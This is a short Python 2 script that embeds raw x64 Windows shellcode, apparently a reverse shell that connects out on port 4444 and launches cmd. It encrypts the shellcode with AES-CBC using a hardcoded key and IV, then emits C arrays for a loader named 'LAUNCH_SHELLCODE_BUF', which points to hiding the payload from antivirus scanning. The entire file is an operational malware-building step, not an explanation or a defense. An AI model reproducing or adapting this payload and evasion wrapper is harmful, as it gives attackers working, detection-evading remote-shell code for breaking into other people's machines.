buf =  ""
buf += "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
buf += "\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
buf += "\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
buf += "\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
buf += "\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
buf += "\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
buf += "\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
buf += "\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
buf += "\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
buf += "\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
buf += "\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
buf += "\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
buf += "\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
buf += "\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
buf += "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
buf += "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32"
buf += "\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec"
buf += "\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c"
buf += "\x00\x00\x00\x00\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41"
buf += "\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01"
buf += "\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50"
buf += "\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48"
buf += "\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5"
buf += "\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9"
buf += "\x41\xba\xc2\xdb\x37\x67\xff\xd5\x48\x31\xd2\x48\x89"
buf += "\xf9\x41\xba\xb7\xe9\x38\xff\xff\xd5\x4d\x31\xc0\x48"
buf += "\x31\xd2\x48\x89\xf9\x41\xba\x74\xec\x3b\xe1\xff\xd5"
buf += "\x48\x89\xf9\x48\x89\xc7\x41\xba\x75\x6e\x4d\x61\xff"
buf += "\xd5\x48\x81\xc4\xa0\x02\x00\x00\x49\xb8\x63\x6d\x64"
buf += "\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
buf += "\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66"
buf += "\xc7\x44\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00"
buf += "\x68\x48\x89\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49"
buf += "\xff\xc0\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89\xc1"
buf += "\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31\xd2\x48\xff"
buf += "\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff\xd5\xbb\xf0"
buf += "\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83"
buf += "\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
buf += "\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from binascii import unhexlify
import hashlib
import sys
m = hashlib.sha256()
key = 'BIGGEST-OOF'
iv = '0123456789abcdef'
m.update(key)
key = m.digest()
key = unhexlify(m.hexdigest())
print("+++ key: " + m.hexdigest())
print("+++ key raw: " + key)
obj = AES.new(key, AES.MODE_CBC, iv)
obj2 = AES.new(key, AES.MODE_CBC, iv)
ct = obj.encrypt(pad(buf, 16))
buf2 = unpad(obj2.decrypt(ct),16)

sys.stdout.write('unsigned char LAUNCH_SHELLCODE_BUF[' + str(len(ct))+ '] = { ')
for i in range(0, len(ct)):
    sys.stdout.write(hex(ord(ct[i])))
    if i % 10 == 0:
        sys.stdout.write(',\n')
    elif i < len(ct)-1:
        sys.stdout.write(',')    
    else:
        pass
sys.stdout.write('};\nint LAUNCH_SHELLCODE_LEN = ' + str(len(ct)) + ';\n')
sys.stdout.write('const unsigned char LAUNCH_KEY[' + str(len(key))+ '] = { ')
for i in range(0, len(key)):
    sys.stdout.write(hex(ord(key[i])))
    if i % 10 == 0:
        sys.stdout.write(',\n')
    elif i < len(key)-1:
        sys.stdout.write(',')    
    else:
        pass
sys.stdout.write('};\nint LAUNCH_KEY_LEN = ' + str(len(key)) + ';\n')
sys.stdout.write('const unsigned char LAUNCH_IV[' + str(len(iv))+ '] = { ')
for i in range(0, len(iv)):
    sys.stdout.write(hex(ord(iv[i])))
    if i % 10 == 0:
        sys.stdout.write(',\n')
    elif i < len(iv)-1:
        sys.stdout.write(',')    
    else:
        pass
sys.stdout.write('};\nint LAUNCH_IV_LEN = ' + str(len(iv)) + ';\n')
